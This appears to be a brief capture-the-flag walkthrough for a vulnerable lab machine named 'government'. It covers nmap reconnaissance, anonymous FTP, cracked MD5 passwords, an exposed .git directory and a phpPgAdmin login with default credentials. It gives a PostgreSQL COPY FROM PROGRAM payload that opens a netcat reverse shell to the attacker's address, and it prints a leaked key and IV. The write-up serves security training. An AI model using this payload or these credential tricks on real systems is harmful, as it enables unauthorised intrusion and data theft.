
brief `NOthing`

# Recon

```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
| drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
|_drwxr-xr-x    2 0        0            4096 Nov 14  2021 news
22/tcp    open  ssh         OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0b959a37aed8b0c02378eb04c29b6c41 (RSA)
|   256 d4a13ba7cce2eaee2e6b9136f9beda6f (ECDSA)
|_  256 229f42603d5620153aff7c190d20ca7a (ED25519)
80/tcp    open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 2 disallowed entries 
|_/login.php /admin
|_http-title: Site doesnt have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      36933/tcp   mountd
|   100005  1,2,3      37971/udp   mountd
|   100005  1,2,3      49135/tcp6  mountd
|   100005  1,2,3      53643/udp6  mountd
|   100021  1,3,4      39687/tcp   nlockmgr
|   100021  1,3,4      42277/tcp6  nlockmgr
|   100021  1,3,4      51097/udp6  nlockmgr
|   100021  1,3,4      58761/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
53025/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:7C:B7:C7 (Oracle VirtualBox virtual NIC)
Service Info: Host: GOVERNMENT; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h26m36s, deviation: 1h09m15s, median: 3h06m35s
| smb2-time: 
|   date: 2024-08-18T04:21:46
|_  start_date: N/A
|_nbstat: NetBIOS name: GOVERNMENT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: government
|   NetBIOS computer name: GOVERNMENT\x00
|   Domain name: \x00
|   FQDN: government
|_  System time: 2024-08-18T06:21:46+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.41 seconds

```

### intresting 

- robots.txt 
	- /login.php /admin 
- ftp anonymous which has files 
```
| drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
| drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
|_drwxr-xr-x    2 0        0            4096 Nov 14  2021 news
```
- ssh 
- nfs 
- smb 
```
|_clock-skew: mean: 2h26m36s, deviation: 1h09m15s, median: 3h06m35s
| smb2-time: 
|   date: 2024-08-18T04:21:46
|_  start_date: N/A
|_nbstat: NetBIOS name: GOVERNMENT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: government
|   NetBIOS computer name: GOVERNMENT\x00
|   Domain name: \x00
|   FQDN: government
|_  System time: 2024-08-18T06:21:46+02:00
```

 dig dipper 
- login in ftp as anonymous 
- get all the files from it 
- old gives passwords in MD5 format 
- cracked the passwords 
```
emma213
cocacola2
hello999
kristenanne
```

- anyways after some dig on the site 
- got git 
```sql 
[03:01:00] 301 -  320B  - /blog/html  ->  http://government.hmv/blog/html/
[03:01:04] 200 -  603B  - /blog/.git/
[03:01:04] 301 -  320B  - /blog/.git  ->  http://government.hmv/blog/.git/
[03:01:04] 200 -  612B  - /blog/.git/hooks/
[03:01:04] 200 -  268B  - /blog/.git/config
[03:01:04] 200 -   73B  - /blog/.git/description
[03:01:04] 200 -  411B  - /blog/.git/branches/
[03:01:04] 200 -   23B  - /blog/.git/HEAD
[03:01:04] 200 -  178B  - /blog/.git/logs/HEAD
[03:01:04] 200 -  459B  - /blog/.git/info/
[03:01:04] 200 -  178B  - /blog/.git/logs/refs/heads/master

```


```sql 
0000000000000000000000000000000000000000 89ec426a5d13873e619eeee3d841937f84378158 root <root@government> 1630406244 +0200	clone: from https://github.com/hacktheme/Nice-Admin.git
```

gobuster dir again got `/phppgadmin` login with postgres and password admin 

run this exploit 
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'nc -e /bin/bash 192.168.0.120 8443';
SELECT * FROM cmd_exec;
```

```
//This file contain sensitive informations!!


/////////////////////////////////////////////////////////////
244fff13bf3c5f471e0e6bf7900945936cf1354dfea15130
////////////////////////////////////////////////////////////
key: Tr770f1NdMy1mP0sSibl3P4sSw0rD,7iK3Th4t!
////////////////////////////////////////////////////////////
IV: 5721370743022037

```

